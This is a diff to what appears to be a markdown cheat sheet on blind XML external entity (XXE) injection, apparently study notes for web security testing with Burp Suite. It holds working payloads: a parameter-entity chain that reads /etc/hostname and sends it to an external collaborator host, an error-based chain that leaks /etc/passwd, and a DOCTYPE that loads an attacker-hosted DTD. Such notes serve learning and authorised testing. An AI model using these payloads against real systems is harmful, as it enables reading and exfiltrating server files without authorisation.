@@ -62,19 +62,22 @@ Blind Injection via ```XML parameter entities```.
 ```
 With real-world XXE vulnerabilities, there will often be a large number of data values within the submitted XML, any one of which might be used within the application's response. To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, by making use of your defined entity and seeing whether it appears within the response.
 ### Exploiting blind XXE via external DTD server
-Host this payload with burp collaborator in external DTD server.
+Host this payloads with burp collaborator in external DTD server.<br>
+To exfiltrate data in collaborator server.
 ```xml
 <!ENTITY % file SYSTEM "file:///etc/hostname">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://uljekvrxmftdii2pjz7amtzpigo7c50u.oastify.com/?x=%file;'>">
 %eval;
 %exfil;
-____________________________________________
+```
+To retrieve data via error messages.
+```xml
 <!ENTITY % file SYSTEM "file:///etc/passwd">
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
 %eval;
 %exfil;
 ```
-Now paste the external DTD server link in burpsuite
+Now paste the external DTD server link in vulnerable xml field.
 ```xml
 <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://external.dtd.server"> %xxe; ]>
 ```
